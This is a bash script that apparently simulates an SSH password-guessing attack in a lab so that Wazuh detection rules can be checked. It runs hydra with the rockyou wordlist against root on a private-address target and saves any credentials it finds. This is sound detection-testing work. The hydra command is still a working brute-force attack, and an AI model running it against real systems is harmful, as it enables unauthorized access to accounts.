#!/bin/bash
# SSH Brute Force Attack Simulation
# Target: Ubuntu Agent (10.10.10.20)
# Expected Wazuh Rules: 100001 (custom), 5716, 5712, 5710 (built-in)
# MITRE: T1110.001 (Password Guessing)

set -e

TARGET="10.10.10.20"
USER="root"
WORDLIST="/usr/share/wordlists/rockyou.txt.gz"
THREADS=4
TIMEOUT=30

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] SSH Brute Force Attack Simulation${NC}"
echo -e "${YELLOW}[*] Target: ${TARGET}${NC}"
echo -e "${YELLOW}[*] User: ${USER}${NC}"
echo -e "${YELLOW}[*] Wordlist: ${WORDLIST}${NC}"
echo ""

# Check if target is reachable
if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
    echo -e "${RED}[!] Target $TARGET is not reachable${NC}"
    exit 1
fi

# Check if wordlist exists
if [[ ! -f "$WORDLIST" ]]; then
    echo -e "${YELLOW}[*] Downloading rockyou wordlist...${NC}"
    sudo apt-get update -qq && sudo apt-get install -y -qq wordlists
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
    WORDLIST="/tmp/rockyou.txt"
fi

echo -e "${GREEN}[*] Starting hydra attack...${NC}"
echo -e "${YELLOW}[*] This will trigger Wazuh rules: 100001, 5716, 5712, 5710${NC}"
echo ""

# Run hydra
hydra -l "$USER" -P "$WORDLIST" "$TARGET" ssh \
    -t "$THREADS" \
    -V \
    -f \
    -w "$TIMEOUT" \
    -o /tmp/hydra_ssh_results.txt \
    2>&1 | tee /tmp/hydra_ssh.log

# Check results
if grep -q "login:" /tmp/hydra_ssh_results.txt 2>/dev/null; then
    echo -e "${GREEN}[+] Attack completed - credentials found!${NC}"
    cat /tmp/hydra_ssh_results.txt
else
    echo -e "${YELLOW}[*] Attack completed - no valid credentials found (expected)${NC}"
fi

echo ""
echo -e "${GREEN}[*] Check Wazuh Dashboard for alerts:${NC}"
echo -e "    https://10.10.10.12:5601"
echo -e "    Filter: rule.id: 100001 OR 5716 OR 5712 OR 5710"
echo -e "    MITRE: T1110.001"